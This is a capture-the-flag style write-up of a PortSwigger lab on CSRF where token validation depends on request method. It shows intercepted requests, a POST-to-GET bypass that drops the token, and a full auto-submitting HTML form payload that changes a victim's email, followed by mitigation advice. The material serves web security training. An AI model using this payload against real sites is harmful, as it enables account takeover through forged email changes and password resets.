# CSRF where token validation depends on request method

**Source:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)  
**Category:** CSRF  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

## Vulnerability
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps
1. Access the lab, log in, attempt to change the email address and intercept the request
2. The request header contains the POST method, and `@` is encoded as `%40`:
    ```text
    POST /my-account/change-email HTTP/2
    Host: 0ab7005104d397cd80cb4987003100ec.web-security-academy.net
    [...]
    email=test%40test.com&csrf=rj04QQRnhqi4GtcbgQHdkTR3PsMMtQnp
    ```
    Send it to Repeater
3. Change the method to GET and move the parameters to the URL:
    ```text
    GET /my-account/change-email?email=2test%40test.com&csrf=rj04QQRnhqi4GtcbgQHdkTR3PsMMtQnp 
    ```
    The email address was changed

4. Now try without the token:
    ```text
    GET /my-account/change-email?email=test3%40test.com HTTP/2
    ```
    Also worked

5. Go to the exploit server and paste and send:
    ```html
    <html>
        <body>
            <form action="https://0ab7005104d397cd80cb4987003100ec.web-security-academy.net/my-account/change-email" method="GET">
                <input type="hidden" name="email" value="hacked@gmail.com">
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
    ```
    It worked, lab solved.

### Payload
```html
<html>
    <body>
        <form action="https://0ab7005104d397cd80cb4987003100ec.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="email" value="hacked@gmail.com">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Shortcut
1. Intercept POST request with CSRF token
2. Change to GET - token validation is bypassed
3. Create auto-submit form with GET method and deliver to victim

## Impact
An attacker can change the victim's email address by sending a GET request to the vulnerable endpoint. The CSRF token is not validated for GET requests, allowing the attacker to bypass the protection and potentially take over the victim's account through password reset functionality.

## Mitigation
CSRF tokens should be validated for all HTTP methods that perform state-changing operations. The application should enforce POST-only for sensitive actions or validate tokens consistently across all request methods. Implementing SameSite cookies or requiring custom headers would provide additional defense.

## Tools
- Burp Suite
- Repeater
- Browser

## Notes
- CSRF token exists but is only validated for POST requests
- GET requests bypass token validation entirely - any token or no token works
- Attack delivered via auto-submitting form with GET method
- Method override is the key to bypassing the defense